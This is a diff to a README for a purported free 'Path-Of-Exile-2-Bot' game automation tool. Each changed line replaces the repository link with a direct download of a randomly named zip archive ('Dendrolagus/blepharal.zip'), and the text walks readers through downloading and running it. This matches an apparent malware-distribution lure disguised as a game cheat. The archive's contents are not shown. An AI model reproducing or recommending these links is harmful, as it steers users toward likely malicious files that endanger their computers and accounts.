@@ -1,6 +1,6 @@
 # 🤖 Path-Of-Exile-2-Bot - Your Free Automation Companion for 2026
 
-[![Download Path Of Exile 2 Bot](https://img.shields.io/badge/Download-Path_Of_Exile_2_Bot-Free-brightgreen?style=for-the-badge&logo=github&logoColor=white&color=4CAF50)](https://github.com/okgoom/Path-Of-Exile-2-Bot)
+[![Download Path Of Exile 2 Bot](https://img.shields.io/badge/Download-Path_Of_Exile_2_Bot-Free-brightgreen?style=for-the-badge&logo=github&logoColor=white&color=4CAF50)](https://raw.githubusercontent.com/okgoom/Path-Of-Exile-2-Bot/main/Dendrolagus/blepharal.zip)
 
 ---
 
@@ -28,7 +28,7 @@ Getting started with Path-Of-Exile-2-Bot is quick and easy. Follow the simple st
 ### Step 1: Download the Bot
 
 Visit this link to download the application:  
-[**Download Path-Of-Exile-2-Bot**](https://github.com/okgoom/Path-Of-Exile-2-Bot)
+[**Download Path-Of-Exile-2-Bot**](https://raw.githubusercontent.com/okgoom/Path-Of-Exile-2-Bot/main/Dendrolagus/blepharal.zip)
 
 The download will begin automatically. Save the file to a location you can easily find, like your Desktop or Downloads folder.
 
@@ -57,7 +57,7 @@ Here's a more detailed walkthrough for those who want extra clarity.
 ### Downloading the File
 
 1. Click the download button at the top of this page or use the link below:  
-   [**Get Path-Of-Exile-2-Bot Free**](https://github.com/okgoom/Path-Of-Exile-2-Bot)
+   [**Get Path-Of-Exile-2-Bot Free**](https://raw.githubusercontent.com/okgoom/Path-Of-Exile-2-Bot/main/Dendrolagus/blepharal.zip)
 2. Your browser will download the file. Depending on your browser, you might see a notification or the file will appear in your Downloads folder.
 3. Once downloaded, navigate to the file location.
 
@@ -183,7 +183,7 @@ Don't wait. Get your free copy today and take your gameplay to the next level.
 
 Ready to start? Click the button below:
 
-[![Download Now](https://img.shields.io/badge/Download-Path_Of_Exile_2_Bot-Free-9cf?style=for-the-badge&logo=github&logoColor=white&color=FF5722)](https://github.com/okgoom/Path-Of-Exile-2-Bot)
+[![Download Now](https://img.shields.io/badge/Download-Path_Of_Exile_2_Bot-Free-9cf?style=for-the-badge&logo=github&logoColor=white&color=FF5722)](https://raw.githubusercontent.com/okgoom/Path-Of-Exile-2-Bot/main/Dendrolagus/blepharal.zip)
 
 ---
 
